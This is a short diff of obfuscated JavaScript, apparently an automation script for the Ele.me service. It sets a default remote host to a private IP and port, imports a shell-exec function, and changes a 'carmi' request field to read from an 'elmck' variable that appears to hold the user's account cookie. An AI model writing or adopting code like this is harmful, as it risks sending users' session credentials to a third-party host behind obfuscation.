@@ -11,7 +11,7 @@ const {
 
 const _0xhicong = require('md5');
 const _0x355d3c = require("child_process")["exec"];
-const _0x483607 = process["env"]["HOST"] || "xxx";
+const _0x483607 = process["env"]["HOST"] || "172.16.33.7:32768";
 const _0xaaf3e8 = "网络异常，跳过";
 function _0x533bff(_0x4d15c4 = 0, _0x14a025 = 100) {
   return Math["min"](Math["floor"](_0x4d15c4 + Math["random"]() * (_0x14a025 - _0x4d15c4)), _0x14a025);
@@ -612,7 +612,7 @@ function _0x57c4d6(_0x682df3, _0x5a93e1, _0x40150c, _0x1eb753, _0x554274,_0x4138
     "utdid": _0x1a3ceb
   };
   const _0x59fcf6 = {
-    "carmi": process["env"]["ELE_CARME"] || process["env"]["ELE_TTCJ_CARME"],
+    "carmi": process["env"]["elmck"] || process["env"]["ELE_TTCJ_CARME"],
     "needSignData": _0x13b82d
   };
   if (_0x1eb753) {
